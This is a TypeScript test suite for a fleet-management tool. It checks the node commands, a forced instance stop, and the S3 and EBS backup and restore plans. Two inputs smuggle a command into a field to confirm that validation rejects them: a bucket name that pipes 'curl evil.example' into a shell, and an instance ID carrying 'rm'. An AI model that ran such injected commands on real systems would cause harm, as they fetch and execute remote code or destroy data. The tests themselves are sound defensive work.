import { describe, expect, it } from "vite-plus/test";

import {
  backupIdFor,
  type BackupManifest,
  copyOutCall,
  manifestKey,
  manifestSchema,
  restorePlan,
  snapshotArgs,
} from "../src/backup.ts";
import { nodeSpec } from "../src/machine.ts";
import { defaultProbePlan } from "../src/probe.ts";
import { killArgs, nodeCommands, startInstanceArgs } from "../src/remote.ts";

const commands = nodeCommands(nodeSpec());
const instanceId = "i-0123456789abcdef0";
const region = "ap-northeast-1";

describe("what is sent to a node", () => {
  it("drains with a plain stop, so celld gets SIGTERM and time to hand its cells off", () => {
    expect(commands.drain()).toEqual([
      "set -euo pipefail",
      "systemctl stop celld.service",
      'systemctl is-active celld.service && exit 1 || echo "celld.service is stopped"',
    ]);
    expect(commands.drain().join("\n")).not.toMatch(/kill|SIGKILL|--force/);
  });

  it("installs a pinned version by its pinned digest, and only those", () => {
    expect(commands.install("my-fleet-bucket", "v0.6.2")).toEqual([
      "/usr/local/sbin/celld-install my-fleet-bucket v0.6.2 4eca87c6797590000a344c1b768364e9696e8817f5fbc16193f459d2edac7cd0",
    ]);
    expect(() => commands.install("my-fleet-bucket", "v0.7.0" as never)).toThrow();
    expect(() => commands.install("bucket; curl evil.example | sh", "v0.6.2")).toThrow(
      "not a bucket name",
    );
  });

  it("asks celld itself for the fleet's state, with the settings systemd gives it", () => {
    expect(commands.diagnose()).toEqual([
      "set -euo pipefail",
      "set -a",
      ". /etc/celld/celld.env",
      "set +a",
      "/opt/celld/current/celld diagnose --json",
    ]);
  });

  it("reads health from the one path celld reserves on the Worker listener", () => {
    expect(commands.health()[1]).toContain("http://127.0.0.1:8080/.well-known/celld/health");
  });

  it("refuses to flush for a snapshot while celld is still running", () => {
    expect(commands.flush()[1]).toBe("systemctl is-active celld.service && exit 1 || true");
  });

  it("sends the probe as the script the tests run", () => {
    const lines = commands.probe(defaultProbePlan("abcd1234"));
    expect(lines[0]).toBe("#!/bin/bash");
    expect(lines.at(-1)).toBe('echo "DONE $count"');
  });
});

describe("losing a node on purpose", () => {
  it("stops the instance without an OS shutdown: no SIGTERM, no handoff", () => {
    expect(killArgs({ instanceId, region })).toEqual([
      "ec2",
      "stop-instances",
      "--instance-ids",
      instanceId,
      "--skip-os-shutdown",
      "--region",
      region,
      "--output",
      "json",
    ]);
    // Stopped, not terminated: the instance and its volume come back with start-instances.
    expect(killArgs({ instanceId, region })).not.toContain("terminate-instances");
    expect(startInstanceArgs({ instanceId, region }).slice(0, 2)).toEqual([
      "ec2",
      "start-instances",
    ]);
    expect(() => killArgs({ instanceId: "i-123; rm", region })).toThrow("not an instance ID");
  });
});

describe("backup and restore", () => {
  const manifest: BackupManifest = manifestSchema.parse({
    id: "20261012T010203Z",
    createdAt: "2026-10-12T01:02:03.000Z",
    region,
    source: { bucket: "my-fleet-bucket", prefix: "fleet" },
    nodes: [
      {
        node: "a",
        volumeId: "vol-0aaaaaaaaaaaaaaaa",
        snapshotId: "snap-0aaaaaaaaaaaaaaaa",
        celldVersion: "v0.6.2",
      },
      {
        node: "b",
        volumeId: "vol-0bbbbbbbbbbbbbbbb",
        snapshotId: "snap-0bbbbbbbbbbbbbbbb",
        celldVersion: "v0.6.2",
      },
    ],
  });
  const restore = (overrides: object = {}) =>
    restorePlan({
      manifest,
      bucket: "my-fleet-bucket",
      backupBucket: "my-backup-bucket",
      nodes: ["a", "b"],
      execute: false,
      ...overrides,
    });

  it("names a backup by the second it was taken", () => {
    expect(backupIdFor(new Date("2026-10-12T01:02:03.456Z"))).toBe("20261012T010203Z");
    expect(manifestKey("20261012T010203Z")).toBe("backups/20261012T010203Z/manifest.json");
  });

  it("copies the fleet prefix into a prefix of its own, and snapshots a node's volume with its name on it", () => {
    const copy = copyOutCall({
      bucket: "my-fleet-bucket",
      prefix: "fleet",
      backupBucket: "my-backup-bucket",
      id: manifest.id,
      region,
    });
    expect(copy.args.slice(0, 4)).toEqual([
      "s3",
      "sync",
      "s3://my-fleet-bucket/fleet/",
      "s3://my-backup-bucket/backups/20261012T010203Z/fleet/",
    ]);
    // A backup never deletes.
    expect(copy.args).not.toContain("--delete");
    expect(
      snapshotArgs({ volumeId: "vol-0aaaaaaaaaaaaaaaa", node: "a", id: manifest.id, region }),
    ).toContain(
      "ResourceType=snapshot,Tags=[{Key=aih:backup,Value=20261012T010203Z},{Key=aih:node,Value=a}]",
    );
  });

  it("only lists what a restore would overwrite unless told to go ahead", () => {
    const [first] = restore();
    expect(first).toMatchObject({ kind: "aws", call: { destructive: true } });
    const args = first?.kind === "aws" ? first.call.args : [];
    expect(args).toContain("--dryrun");
    expect(args.slice(0, 5)).toEqual([
      "s3",
      "sync",
      "s3://my-backup-bucket/backups/20261012T010203Z/fleet/",
      "s3://my-fleet-bucket/fleet/",
      "--delete",
    ]);
    const [executed] = restore({ execute: true });
    expect(executed?.kind === "aws" ? executed.call.args : []).not.toContain("--dryrun");
  });

  it("gives every node its own disk back, as one deploy", () => {
    expect(restore()[1]).toMatchObject({
      kind: "manual",
      command:
        "vp run celld:infra:deploy -c nodes=2 -c dataSnapshots=a:snap-0aaaaaaaaaaaaaaaa,b:snap-0bbbbbbbbbbbbbbbb",
    });
  });

  it("refuses a backup from another bucket, or one that does not cover exactly this fleet", () => {
    expect(() => restore({ bucket: "another-bucket" })).toThrow("was taken from my-fleet-bucket");
    // A bucket from the backup with a disk that is newer (or empty) is not a state to start celld in.
    expect(() => restore({ nodes: ["a", "b", "c"] })).toThrow("Every node needs its own disk back");
    expect(() => restore({ nodes: ["a"] })).toThrow("Every node needs its own disk back");
  });
});
